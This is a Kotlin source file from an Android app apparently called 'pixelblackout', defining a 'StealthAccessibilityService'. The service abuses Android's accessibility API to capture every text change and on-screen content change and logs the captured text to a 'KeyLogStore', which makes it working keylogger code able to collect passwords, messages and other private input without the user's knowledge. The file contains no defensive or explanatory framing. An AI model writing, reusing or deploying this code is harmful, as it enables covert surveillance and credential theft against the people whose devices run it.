package com.example.pixelblackout.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.example.pixelblackout.managers.KeyLogStore

class StealthAccessibilityService : AccessibilityService() {
    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        KeyLogStore.append(this, KeyLogStore.SOURCE_SERVICE, "Stealth service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val textValues = event.text
        if (textValues.isNullOrEmpty()) {
            return
        }
        val text = textValues.joinToString(separator = " ").trim()
        if (text.isNotEmpty()) {
            KeyLogStore.append(this, KeyLogStore.SOURCE_ACCESSIBILITY, text)
        }
    }

    override fun onInterrupt() {
        KeyLogStore.append(this, KeyLogStore.SOURCE_SERVICE, "Accessibility interrupted")
    }
}
